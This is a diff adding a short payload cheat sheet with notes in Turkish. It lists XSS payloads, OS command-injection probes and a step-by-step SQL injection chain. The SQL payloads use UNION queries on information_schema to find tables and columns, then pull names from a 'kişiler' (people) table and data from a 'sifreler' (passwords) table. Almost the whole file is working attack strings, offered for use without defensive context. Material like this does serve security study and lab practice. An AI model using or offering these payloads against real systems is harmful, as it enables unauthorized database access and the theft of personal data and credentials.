@@ -1,0 +1,33 @@
+XSS Payloads 
+1-) <image/src/onerror=prompt(8)>
+2-) "><img src="x" onerror="alert('XSS')">
+            
+
+Os Command Payloads 
+1-)ping 8.8.8.8
+2-) ipconfig
+
+SQL Payloads
+1-)' , '' , /
+
+2-hangi sütunların bastırıldığını öğrenme ' OR 1 = 2 UNION SELECT 1,2,3,4 -- -
+
+3-)sql sorgu  tablo isimlerini öğrenme = ' OR 1 = 2 UNION SELECT TABLE_NAME,2,3,4 FROM INFORMATİON_SCHEMA .TABLES WHERE TABLE_SCHEMA = DATABASE() --  -  
+
+4-) kişiler tablosundaki kolon adlarını öğrenme  = ' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'kişiler' -- -
+
+5-)adını öğrendiğim kişiler tablosunda verileri çekme =  ' UNION SELECT id, ad, soyad, NULL FROM kişiler -- -
+
+6-) şifreler tablosundaki kolon adlarını öğrenme = ' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'sifreler' -- -
+
+7-) adını öğrendiğim şifreler tablosunda verileri çekme =' UNION SELECT id, pid, NULL,NULL FROM sifreler -- -
+
+
+
+
+
+
+
+
+
+
